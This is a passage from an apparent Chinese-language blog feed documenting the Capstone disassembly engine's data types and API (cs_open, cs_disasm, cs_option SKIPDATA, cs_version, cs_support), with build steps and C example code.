class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);  <span class="comment">//错误检查</span></span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开SKIPDATA 模式</span></span><br><span class="line">cs_option(handle, CS_OPT_SKIPDATA, CS_OPT_ON);</span><br><span class="line">cs_option(handle, platforms[i].opt_skipdata, platforms[i].skipdata);</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, platforms[i].code, platforms[i].size, address, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;  <span class="comment">//输出汇编</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s\n"</span>,</span><br><span class="line">insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最后一行代码后打印偏移</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\n"</span>, insn[j - <span class="number">1</span>].address + insn[j - <span class="number">1</span>].size);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 释放cs_disasm()申请的内存</span></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disasm given code!\n"</span>);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>运行结果如下，可以看出，默认的 .byte数据类型被改为db描述符<br><a href="https://i.loli.net/2019/07/21/5d3457518e35444335.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d3457518e35444335.jpg" class="lazyload"></a></p><h3 id="cs-version"><a href="#cs-version" class="headerlink" title="cs_version"></a>cs_version</h3><p><code>unsigned int CAPSTONE_API cs_version(int *major, int *minor);</code></p><p>用来输出capstone版本号<br>参数<br>major: API主版本<br>minor: API次版本<br>return: 返回主次版本的16进制，如4.0版本返回 0x0400</p><p>通过分析源码发现<br><a href="https://i.loli.net/2019/07/21/5d345fe61e3c630129.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d345fe61e3c630129.jpg" class="lazyload"></a></p><p><a href="https://i.loli.net/2019/07/21/5d34602a326f528259.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d34602a326f528259.jpg" class="lazyload"></a><br>该版本定义于cs.c中，编译后不可更改，不接受自定义版本</p><p>示例1：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">return</span> cs_version(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出<br><a href="https://i.loli.net/2019/07/21/5d3465239ff2d14595.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d3465239ff2d14595.jpg" class="lazyload"></a></p><p>示例2，强行修改版本：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ma[] = &#123; <span class="number">5</span> &#125;;</span><br><span class="line"><span class="keyword">int</span> mi[] = &#123; <span class="number">6</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> cs_version(ma, mi);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> version = test();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%X"</span>, version);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>输出：<br><a href="https://i.loli.net/2019/07/21/5d3465bc7716b49405.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d3465bc7716b49405.jpg" class="lazyload"></a><br>可以看到并不能改变</p><h3 id="cs-support"><a href="#cs-support" class="headerlink" title="cs_support"></a>cs_support</h3><p>bool CAPSTONE_API cs_support(int query);</p><p>用来检查capstone库是否支持参数输入的架构或处于某编译选项<br>通过查看源码得知，共有四种查询参数</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">cpp</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> CAPSTONE_API <span class="title">cs_support</span><span class="params">(<span class="keyword">int</span> query)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span> (query == CS_ARCH_ALL)</span><br><span class="line"><span class="keyword">return</span> all_arch == ((<span class="number">1</span> &lt;&lt; CS_ARCH_ARM) | (<span class="number">1</span> &lt;&lt; CS_ARCH_ARM64) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_MIPS) | (<span class="number">1</span> &lt;&lt; CS_ARCH_X86) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_PPC) | (<span class="number">1</span> &lt;&lt; CS_ARCH_SPARC) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_SYSZ) | (<span class="number">1</span> &lt;&lt; CS_ARCH_XCORE) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M68K) | (<span class="number">1</span> &lt;&lt; CS_ARCH_TMS320C64X) |</span><br><span class="line">(<span class="number">1</span> &lt;&lt; CS_ARCH_M680X) | (<span class="number">1</span> &lt;&lt; CS_ARCH_EVM));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)query &lt; CS_ARCH_MAX)</span><br><span class="line"><span class="keyword">return</span> all_arch &amp; (<span class="number">1</span> &lt;&lt; query);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_DIET) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (query == CS_SUPPORT_X86_REDUCE) &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> defined(CAPSTONE_HAS_X86) &amp;&amp; defined(CAPSTONE_X86_REDUCE)</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// unsupported query</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>示例1(CS_ARCH_ALL，检查是否支持所有架构)：<br><a href="https://i.loli.net/2019/07/21/5d3469069954048775.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d3469069954048775.jpg" class="lazyload"></a></p><p>示例2(CS_ARCH_*，检查是否支持指定架构)<br><a href="https://i.loli.net/2019/07/21/5d34698a9ee7d33247.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d34698a9ee7d33247.jpg" class="lazyload"></a></p><p>示例3(检查是否处于DIET编译模式)：<br><a href="https://i.loli.net/2019/07/21/5d346a147b7e947704.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d346a147b7e947704.jpg" class="lazyload"></a></p><p>示例4(检查是否处于X86_REDUCE编译模式)：<br><a href="https://i.loli.net/2019/07/21/5d346a844b5b058873.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/21/5d346a844b5b058873.jpg" class="lazyload"></a>))</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;h1 id=&quot;Capstone反汇编引擎数据类型及API分析及示例-二&quot;&gt;&lt;a href=&quot;#Capstone反汇编引擎数据类型及API分析及示例-二&quot; class=&quot;headerlink&quot;</summary>
        
      
    
    
    
    <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
    
    <category term="反汇编" scheme="https://kabeor.github.io/tags/%E5%8F%8D%E6%B1%87%E7%BC%96/"/>
    
  </entry>
  
  <entry>
    <title>Capstone反汇编引擎数据类型及API分析及示例(一)</title>
    <link href="https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%80)/"/>
    <id>https://kabeor.github.io/Capstone%E5%8F%8D%E6%B1%87%E7%BC%96%E5%BC%95%E6%93%8E%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%8F%8AAPI%E5%88%86%E6%9E%90%E5%8F%8A%E7%A4%BA%E4%BE%8B(%E4%B8%80)/</id>
    <published>2019-07-25T16:00:00.000Z</published>
    <updated>2020-03-16T04:39:42.136Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Capstone反汇编引擎数据类型及API分析及示例-一"><a href="#Capstone反汇编引擎数据类型及API分析及示例-一" class="headerlink" title="Capstone反汇编引擎数据类型及API分析及示例(一)"></a>Capstone反汇编引擎数据类型及API分析及示例(一)</h1><blockquote><p>本文由本人首发于先知社区 <a href="https://xz.aliyun.com/t/5753" target="_blank" rel="noopener">https://xz.aliyun.com/t/5753</a></p></blockquote><p>最近准备用开源的反汇编引擎做个项目，研究了OllyDebug的ODDisasm，disasm与assembl部分代码的思想都很值得学习，但毕竟是2000年的产物，指令集只支持x86，也没有对语义的深度分析，于是转向了对Capstone的研究。</p><p>Capstone反汇编引擎可以说是如今世界上最优秀的反汇编引擎，IDA，Radare2，Qemu等著名项目都使用了Capstone Engine，所以选择它来开发是一个不错的选择。<br>但在开发时发现官方并未给出详细API文档，网上也没有类似的分析，因此想到自己阅读源码和试验，由此写出了一个简单的非官方版本的API手册，希望能与大家分享。</p><h2 id="0x0-开发准备"><a href="#0x0-开发准备" class="headerlink" title="0x0 开发准备"></a>0x0 开发准备</h2><p>  Capstone官网： <a href="http://www.capstone-engine.org" target="_blank" rel="noopener">http://www.capstone-engine.org</a></p><h3 id="自行编译lib和dll方法"><a href="#自行编译lib和dll方法" class="headerlink" title="自行编译lib和dll方法"></a>自行编译lib和dll方法</h3><p>  源码： <a href="https://github.com/aquynh/capstone/archive/4.0.1.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/archive/4.0.1.zip</a></p><p>  下载后解压<br>  文件结构如下：</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">   .                   &lt;- 主要引擎core engine + README + 编译文档COMPILE.TXT 等</span><br><span class="line">├── arch            &lt;- 各语言反编译支持的代码实现</span><br><span class="line">│   ├── AArch64     &lt;- ARM64 (aka ARMv8) 引擎</span><br><span class="line">│   ├── ARM         &lt;- ARM 引擎</span><br><span class="line">│   ├── EVM         &lt;- Ethereum 引擎</span><br><span class="line">│   ├── M680X       &lt;- M680X 引擎</span><br><span class="line">│   ├── M68K        &lt;- M68K 引擎</span><br><span class="line">│   ├── Mips        &lt;- Mips 引擎</span><br><span class="line">│   ├── PowerPC     &lt;- PowerPC 引擎</span><br><span class="line">│   ├── Sparc       &lt;- Sparc 引擎</span><br><span class="line">│   ├── SystemZ     &lt;- SystemZ 引擎</span><br><span class="line">│   ├── TMS320C64x  &lt;- TMS320C64x 引擎</span><br><span class="line">│   ├── X86         &lt;- X86 引擎</span><br><span class="line">│   └── XCore       &lt;- XCore 引擎</span><br><span class="line">├── bindings        &lt;- 中间件</span><br><span class="line">│   ├── java        &lt;- Java 中间件 + 测试代码</span><br><span class="line">│   ├── ocaml       &lt;- Ocaml 中间件 + 测试代码</span><br><span class="line">│   └── python      &lt;- Python 中间件 + 测试代码</span><br><span class="line">├── contrib         &lt;- 社区代码</span><br><span class="line">├── cstool          &lt;- Cstool 检测工具源码</span><br><span class="line">├── docs            &lt;- 文档，主要是capstone的实现思路</span><br><span class="line">├── include         &lt;- C头文件</span><br><span class="line">├── msvc            &lt;- Microsoft Visual Studio 支持（Windows）</span><br><span class="line">├── packages        &lt;- Linux&#x2F;OSX&#x2F;BSD包</span><br><span class="line">├── windows         &lt;- Windows 支持(Windows内核驱动编译)</span><br><span class="line">├── suite           &lt;- Capstone开发测试工具</span><br><span class="line">├── tests           &lt;- C语言测试用例</span><br><span class="line">└── xcode           &lt;- Xcode 支持 (MacOSX 编译)</span><br></pre></td></tr></table></figure></div><p>下面演示Windows10使用Visual Studio2019编译</p><p>复制msvc文件夹到一个比较清爽的位置（强迫症专用），内部结构如下：</p><p><a href="https://i.loli.net/2019/07/20/5d32b771e4c0118081.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32b771e4c0118081.jpg" class="lazyload"></a></p><p>VS打开capstone.sln项目文件，解决方案自动载入这些</p><p><a href="https://i.loli.net/2019/07/20/5d32b810db76b87698.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32b810db76b87698.jpg" class="lazyload"></a></p><p>可以看到支持的所有语言都在这里了，如果都需要的话，直接编译就好了，只需要其中几种，则右键解决方案-&gt;属性-&gt;配置属性  如下</p><p><a href="https://i.loli.net/2019/07/20/5d32b92a26e1328865.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32b92a26e1328865.jpg" class="lazyload"></a></p><p>生成选项中勾选你需要的支持项即可<br>编译后会在当前文件夹Debug目录下生成capstone.lib静态编译库和capstone.dll动态库这样就可以开始使用Capstone进行开发了</p><p>如果不想自己编译，官方也提供了官方编译版本<br>Win32： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win32.zip</a><br>Win64： <a href="https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip" target="_blank" rel="noopener">https://github.com/aquynh/capstone/releases/download/4.0.1/capstone-4.0.1-win64.zip</a></p><p>选x32或x64将影响后面开发的位数</p><h3 id="引擎调用测试"><a href="#引擎调用测试" class="headerlink" title="引擎调用测试"></a>引擎调用测试</h3><p>新建一个VS项目，将..\capstone-4.0.1\include\capstone中的头文件以及编译好的lib和dll文件全部拷贝到新建项目的主目录下</p><p><a href="https://i.loli.net/2019/07/20/5d32bbbde025889046.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32bbbde025889046.jpg" class="lazyload"></a></p><p>在VS解决方案中，头文件添加现有项capstone.h，资源文件中添加capstone.lib，重新生成解决方案</p><p><a href="https://i.loli.net/2019/07/20/5d32bc284c4e175661.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32bc284c4e175661.jpg" class="lazyload"></a></p><p>那么现在来测试一下我们自己的capstone引擎吧</p><p>主文件写入如下代码</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c++</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cinttypes&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CODE <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00"</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">csh handle;</span><br><span class="line">cs_insn* insn;</span><br><span class="line"><span class="keyword">size_t</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to initialize engine!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">count = cs_disasm(handle, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)CODE, <span class="keyword">sizeof</span>(CODE) - <span class="number">1</span>, <span class="number">0x1000</span>, <span class="number">0</span>, &amp;insn);</span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="keyword">size_t</span> j;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; count; j++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span><span class="string">"Ix"</span><span class="string">":\t%s\t\t%s\n"</span>, insn[j].address, insn[j].mnemonic, insn[j].op_str);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cs_free(insn, count);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"ERROR: Failed to disassemble given code!\n"</span>);</span><br><span class="line"></span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>事实上这是官方给出的C语言开发唯一几个例子之一，但注意到代码cs_open(CS_ARCH_X86, CS_MODE_64, &amp;handle)，测试的是archx64的反编译，因此编译选项也需要设置为x64，除此以外，如果你的项目像我一样是c++开发，那么printf(“0x%””Ix””:\t%s\t\t%s\n”, insn[j].address, insn[j].mnemonic, insn[j].op_str);处官方给出的”0x%”PRIx64”:\t%s\t\t%s\n”应修改为我这里的”0x%””Ix””:\t%s\t\t%s\n”，这是inttypes支持问题。</p><p>运行结果<br><a href="https://i.loli.net/2019/07/20/5d32ca5adbd7040022.jpg" data-fancybox="group" data-caption class="fancybox"><img alt title data-src="https://i.loli.net/2019/07/20/5d32ca5adbd7040022.jpg" class="lazyload"></a></p><h2 id="0x1-数据类型及API分析"><a href="#0x1-数据类型及API分析" class="headerlink" title="0x1 数据类型及API分析"></a>0x1 数据类型及API分析</h2><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><h4 id="csh"><a href="#csh" class="headerlink" title="csh"></a>csh</h4><p>用于生成调用capstone API的句柄<br><code>size_t csh</code> </p><blockquote><p>用法： <code>csh handle;</code></p></blockquote><h4 id="cs-arch"><a href="#cs-arch" class="headerlink" title="cs_arch"></a>cs_arch</h4><p>架构选择</p> <div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">enum</span> cs_arch &#123;</span><br><span class="line">CS_ARCH_ARM = <span class="number">0</span>,<span class="comment">///&lt; ARM 架构 (包括 Thumb, Thumb-2)</span></span><br><span class="line">CS_ARCH_ARM64,<span class="comment">///&lt; ARM-64, 也叫 AArch64</span></span><br><span class="line">CS_ARCH_MIPS,<span class="comment">///&lt; Mips 架构</span></span><br><span class="line">   CS_ARCH_X86,<span class="comment">///&lt; X86 架构 (包括 x86 &amp; x86-64)</span></span><br><span class="line">CS_ARCH_PPC,<span class="comment">///&lt; PowerPC 架构</span></span><br><span class="line">CS_ARCH_SPARC,<span class="comment">///&lt; Sparc 架构</span></span><br><span class="line">CS_ARCH_SYSZ,<span class="comment">///&lt; SystemZ 架构</span></span><br><span class="line">CS_ARCH_XCORE,<span class="comment">///&lt; XCore 架构</span></span><br><span class="line">CS_ARCH_M68K,<span class="comment">///&lt; 68K 架构</span></span><br><span class="line">CS_ARCH_TMS320C64X,<span class="comment">///&lt; TMS320C64x 架构</span></span><br><span class="line">CS_ARCH_M680X,<span class="comment">///&lt; 680X 架构</span></span><br><span class="line">CS_ARCH_EVM,<span class="comment">///&lt; Ethereum 架构</span></span><br><span class="line">CS_ARCH_MAX,</span><br><span class="line">CS_ARCH_ALL = <span class="number">0xFFFF</span>, <span class="comment">// All 架构 - for cs_support()</span></span><br><span class="line">&#125; cs_arch;</span><br></pre></td></tr></table></figure></div><blockquote><p>用法：API中cs_arch参数填入枚举内容，如API中cs_open(cs_arch arch, cs_mode mode, csh *handle);第一个参数填CS_ARCH_X86则支持X86 架构</p></blockquote><h4 id="cs-mode"><a href="#cs-mode" class="headerlink" title="cs_mode"></a>cs_mode</h4><p>模式选择</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> cs_mode &#123;</span><br><span class="line">CS_MODE_LITTLE_ENDIAN = <span class="number">0</span>,<span class="comment">///&lt; little-endian 模式 (default 模式)</span></span><br><span class="line">CS_MODE_ARM = <span class="number">0</span>,<span class="comment">///&lt; 32-bit ARM</span></span><br><span class="line">CS_MODE_16 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>,<span class="comment">///&lt; 16-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_32 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>,<span class="comment">///&lt; 32-bit 模式 (X86)</span></span><br><span class="line">CS_MODE_64 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>,<span class="comment">///&lt; 64-bit 模式 (X86, PPC)</span></span><br><span class="line">CS_MODE_THUMB = <span class="number">1</span> &lt;&lt; <span class="number">4</span>,<span class="comment">///&lt; ARM's Thumb 模式, 包括 Thumb-2</span></span><br><span class="line">CS_MODE_MCLASS = <span class="number">1</span> &lt;&lt; <span class="number">5</span>,<span class="comment">///&lt; ARM's Cortex-M 系列</span></span><br><span class="line">CS_MODE_V8 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>,<span class="comment">///&lt; ARM解码方式ARMv8 A32 </span></span><br><span class="line">CS_MODE_MICRO = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; MicroMips 模式 (MIPS)</span></span><br><span class="line">CS_MODE_MIPS3 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; Mips III ISA</span></span><br><span class="line">CS_MODE_MIPS32R6 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; Mips32r6 ISA</span></span><br><span class="line">CS_MODE_MIPS2 = <span class="number">1</span> &lt;&lt; <span class="number">7</span>, <span class="comment">///&lt; Mips II ISA</span></span><br><span class="line">CS_MODE_V9 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; SparcV9 模式 (Sparc)</span></span><br><span class="line">CS_MODE_QPX = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; Quad Processing eXtensions 模式 (PPC)</span></span><br><span class="line">CS_MODE_M68K_000 = <span class="number">1</span> &lt;&lt; <span class="number">1</span>, <span class="comment">///&lt; M68K 68000 模式</span></span><br><span class="line">CS_MODE_M68K_010 = <span class="number">1</span> &lt;&lt; <span class="number">2</span>, <span class="comment">///&lt; M68K 68010 模式</span></span><br><span class="line">CS_MODE_M68K_020 = <span class="number">1</span> &lt;&lt; <span class="number">3</span>, <span class="comment">///&lt; M68K 68020 模式</span></span><br><span class="line">CS_MODE_M68K_030 = <span class="number">1</span> &lt;&lt; <span class="number">4</span>, <span class="comment">///&lt; M68K 68030 模式</span></span><br><span class="line">CS_MODE_M68K_040 = <span class="number">1</span> &lt;&lt; <span class="number">5</span>, <span class="comment">///&lt; M68K 68040 模式</span></span><br><span class="line">CS_MODE_M68K_060 = <span class="number">1</span> &lt;&lt; <span class="number">6</span>, <span class="comment">///&lt; M68K 68060 模式</span></span><br><span class="line">CS_MODE_BIG_ENDIAN = <span class="number">1</span> &lt;&lt; <span class="number">31</span>,<span class="comment">///&lt; big-endian 模式</span></span><br><span class="line">CS_MODE_MIPS32 = CS_MODE_32,<span class="comment">///&lt; Mips32 ISA (Mips)</span></span><br><span class="line">CS_MODE_MIPS64 = CS_MODE_64,<span class="comment">///&lt; Mips64 ISA (Mips)</span></span><br><span class="line">CS_MODE_M680X_6301 = <span class="number">1</span> 